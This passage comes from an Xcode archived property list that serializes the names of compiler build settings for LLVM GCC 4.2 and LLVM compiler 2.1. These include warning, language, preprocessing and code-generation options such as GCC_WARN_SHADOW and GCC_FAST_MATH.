		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_OBJC_EXCEPTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_TRIGRAPHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_FLOATING_POINT_LIBRARY_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_USE_INDIRECT_FUNCTION_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_USE_REGISTER_FUNCTION_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_INCREASE_PRECOMPILED_HEADER_SHARING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_CW_ASM_SYNTAX</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||OTHER_CFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||OTHER_CPLUSPLUSFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_PRECOMPILE_PREFIX_HEADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_PREFIX_HEADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_BUILTIN_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_ENABLE_PASCAL_STRINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_FORCE_CPU_SUBTYPE_ALL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_SHORT_ENUMS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Language||GCC_USE_STANDARD_INCLUDE_SEARCHING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Preprocessing||GCC_PREPROCESSOR_DEFINITIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Preprocessing||GCC_PREPROCESSOR_DEFINITIONS_NOT_USED_IN_PRECOMPS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_CHECK_SWITCH_STATEMENTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_EFFECTIVE_CPLUSPLUS_VIOLATIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_FOUR_CHARACTER_CONSTANTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_SHADOW</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_64_TO_32_BIT_CONVERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ALLOW_INCOMPLETE_PROTOCOL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_INHIBIT_ALL_WARNINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_INITIALIZER_NOT_FULLY_BRACKETED</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_RETURN_TYPE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_MISSING_PARENTHESES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_MISSING_FIELD_INITIALIZERS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_MISSING_PROTOTYPES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_MISSING_NEWLINE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_MULTIPLE_DEFINITION_TYPES_FOR_SELECTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_NON_VIRTUAL_DESTRUCTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||WARNING_CFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_HIDDEN_VIRTUAL_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_PEDANTIC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_POINTER_SIGNEDNESS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_PROTOTYPE_CONVERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_SIGN_COMPARE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_STRICT_SELECTOR_MATCH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_TREAT_IMPLICIT_FUNCTION_DECLARATIONS_AS_ERRORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_TREAT_NONCONFORMANT_CODE_ERRORS_AS_WARNINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_TREAT_WARNINGS_AS_ERRORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_TYPECHECK_CALLS_TO_PRINTF</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNDECLARED_SELECTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNINITIALIZED_AUTOS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNKNOWN_PRAGMAS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNUSED_FUNCTION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNUSED_LABEL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNUSED_PARAMETER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNUSED_VALUE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_UNUSED_VARIABLE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_DEPRECATED_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM GCC 4.2 - Warnings||GCC_WARN_ABOUT_INVALID_OFFSETOF_MACRO</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_FAST_OBJC_DISPATCH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_SSE3_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_SSE41_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_SSE42_EXTENSIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_SUPPLEMENTAL_SSE3_INSTRUCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_STRICT_ALIASING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_GENERATE_DEBUGGING_SYMBOLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_DYNAMIC_NO_PIC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_INLINES_ARE_PRIVATE_EXTERN</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_KERNEL_DEVELOPMENT</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||LLVM_LTO</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_REUSE_STRINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_NO_COMMON_BLOCKS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_ENABLE_OBJC_GC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_FAST_MATH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_THREADSAFE_STATICS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_SYMBOLS_PRIVATE_EXTERN</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Code Generation||GCC_UNROLL_LOOPS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_CHAR_IS_UNSIGNED_CHAR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_ASM_KEYWORD</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_C_LANGUAGE_STANDARD</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_INPUT_FILETYPE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_CPP_EXCEPTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_CPP_RTTI</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_LINK_WITH_DYNAMIC_LIBRARIES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_OBJC_EXCEPTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_TRIGRAPHS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_FLOATING_POINT_LIBRARY_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_USE_INDIRECT_FUNCTION_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_USE_REGISTER_FUNCTION_CALLS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_INCREASE_PRECOMPILED_HEADER_SHARING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_CW_ASM_SYNTAX</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||OTHER_CFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||OTHER_CPLUSPLUSFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_PRECOMPILE_PREFIX_HEADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_PREFIX_HEADER</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_BUILTIN_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_ENABLE_PASCAL_STRINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_FORCE_CPU_SUBTYPE_ALL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_SHORT_ENUMS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Language||GCC_USE_STANDARD_INCLUDE_SEARCHING</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Preprocessing||GCC_PREPROCESSOR_DEFINITIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Preprocessing||GCC_PREPROCESSOR_DEFINITIONS_NOT_USED_IN_PRECOMPS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_CHECK_SWITCH_STATEMENTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_FOUR_CHARACTER_CONSTANTS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_SHADOW</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_64_TO_32_BIT_CONVERSION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ALLOW_INCOMPLETE_PROTOCOL</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_INHIBIT_ALL_WARNINGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_INITIALIZER_NOT_FULLY_BRACKETED</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_RETURN_TYPE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_MISSING_PARENTHESES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_MISSING_FIELD_INITIALIZERS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_MISSING_PROTOTYPES</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_MISSING_NEWLINE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_MULTIPLE_DEFINITION_TYPES_FOR_SELECTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_NON_VIRTUAL_DESTRUCTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||WARNING_CFLAGS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_HIDDEN_VIRTUAL_FUNCTIONS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_PEDANTIC</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_ABOUT_POINTER_SIGNEDNESS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_SIGN_COMPARE</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_STRICT_SELECTOR_MATCH</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_TREAT_INCOMPATIBLE_POINTER_TYPE_WARNINGS_AS_ERRORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_TREAT_IMPLICIT_FUNCTION_DECLARATIONS_AS_ERRORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_TREAT_WARNINGS_AS_ERRORS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_TYPECHECK_CALLS_TO_PRINTF</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNDECLARED_SELECTOR</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNINITIALIZED_AUTOS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNKNOWN_PRAGMAS</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
			<string>LLVM compiler 2.1 - Warnings||GCC_WARN_UNUSED_FUNCTION</string>
		</dict>
		<dict>
			<key>$class</key>
			<dict>
				<key>CF$UID</key>
				<integer>49</integer>
			</dict>
			<key>NS.string</key>
